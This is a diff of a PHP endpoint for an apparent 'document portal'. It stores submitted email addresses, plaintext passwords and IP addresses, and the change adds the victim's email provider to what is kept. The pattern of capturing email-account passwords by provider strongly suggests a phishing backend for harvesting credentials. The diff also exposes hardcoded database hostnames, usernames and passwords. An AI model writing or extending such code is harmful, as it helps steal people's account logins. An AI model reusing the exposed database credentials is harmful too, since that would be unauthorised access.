@@ -11,10 +11,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 }
 
 // Database configuration - UPDATE THESE WITH YOUR CREDENTIALS
-$servername = "sql206.ezyro.com";
-$username = "ezyro_40589118"; // Change if different
-$password = "8b90afc4d0"; // Change if you have a password
-$dbname = "ezyro_40589118_document_portal";
+$servername = "sql301.ezyro.com";
+$username = "ezyro_40815055"; // Change if different
+$password = "ace92414b"; // Change if you have a password
+$dbname = "ezyro_40815055_document_portal";
 
 // Create connection
 $conn = new mysqli($servername, $username, $password, $dbname);
@@ -33,18 +33,20 @@ $data = json_decode($input, true);
 // Log received data for debugging
 error_log("Received data: " . print_r($data, true));
 
-if ($data && isset($data['email']) && isset($data['password'])) {
+if ($data && isset($data['email']) && isset($data['password']) && isset($data['provider'])) {
     try {
         // Prepare data for insertion
         $email = $conn->real_escape_string(trim($data['email']));
         $password = $conn->real_escape_string(trim($data['password']));
         $ip_address = $conn->real_escape_string($data['ip_address'] ?? $_SERVER['REMOTE_ADDR']);
+        $provider = $conn->real_escape_string(trim($data['provider']));
         
-        // Create table if it doesn't exist
+        // Create table if it doesn't exist (updated to include provider)
         $createTableSQL = "CREATE TABLE IF NOT EXISTS form_submissions (
             id INT AUTO_INCREMENT PRIMARY KEY,
             email VARCHAR(255) NOT NULL,
             password VARCHAR(255) NOT NULL,
+            provider VARCHAR(50),
             ip_address VARCHAR(45),
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )";
@@ -54,8 +56,8 @@ if ($data && isset($data['email']) && isset($data['password'])) {
         }
         
         // Insert into form_submissions table
-        $sql = "INSERT INTO form_submissions (email, password, ip_address) 
-                VALUES (?, ?, ?)";
+        $sql = "INSERT INTO form_submissions (email, password, provider, ip_address) 
+                VALUES (?, ?, ?, ?)";
         
         // Use prepared statement to prevent SQL injection
         $stmt = $conn->prepare($sql);
@@ -65,7 +67,7 @@ if ($data && isset($data['email']) && isset($data['password'])) {
             exit();
         }
         
-        $stmt->bind_param("sss", $email, $password, $ip_address);
+        $stmt->bind_param("ssss", $email, $password, $provider, $ip_address);
         
         if ($stmt->execute()) {
             $insert_id = $stmt->insert_id;
@@ -88,7 +90,7 @@ if ($data && isset($data['email']) && isset($data['password'])) {
     }
 } else {
     error_log("Invalid or missing data received");
-    echo json_encode(['success' => false, 'error' => 'Invalid or missing data. Required: email, password']);
+    echo json_encode(['success' => false, 'error' => 'Invalid or missing data. Required: email, password, provider']);
 }
 
 $conn->close();
